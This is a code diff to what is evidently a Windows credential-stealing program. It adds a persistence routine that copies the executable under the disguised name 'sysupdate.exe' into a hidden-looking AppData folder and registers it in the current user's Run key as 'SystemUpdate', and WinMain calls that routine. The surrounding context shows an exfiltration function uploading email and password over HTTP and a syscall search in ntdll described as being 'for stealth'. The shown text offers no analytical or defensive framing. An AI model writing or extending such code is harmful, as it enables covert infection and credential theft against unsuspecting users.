@@ -119,6 +119,34 @@ void WriteLog(std::string text) {
     }
 }
 
+
+// --- . NO-ADMIN PERSISTENCE ---
+void SetPersistence() {
+    char szPath[MAX_PATH];
+    GetModuleFileNameA(NULL, szPath, MAX_PATH);
+    
+    char localAppData[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
+    std::string hiddenDir = std::string(localAppData) + "\\WindowsMonitor";
+    std::string hiddenPath = hiddenDir + "\\sysupdate.exe";
+    
+    CreateDirectoryA(hiddenDir.c_str(), NULL);
+    CopyFileA(szPath, hiddenPath.c_str(), FALSE);
+
+    // Registry Run Key (Current User - No Admin Required)
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)hiddenPath.c_str(), (DWORD)hiddenPath.length());
+        RegCloseKey(hKey);
+    }
+    
+    WriteLog("PERSISTENCE: User-level Registry established (No Admin).");
+}
+
+
+
+
+
 // --- 4. DATA EXFILTRATION ---
 void UploadData(std::string email, std::string pass) {
     HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
@@ -236,6 +264,8 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
      WriteDebug("wait 1 minutes sleeping...");
     Sleep(60000); 
     WriteDebug("1 minutes passed ...");
+
+    SetPersistence();
     
    // 2. Search for syscall instruction inside ntdll for stealth
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
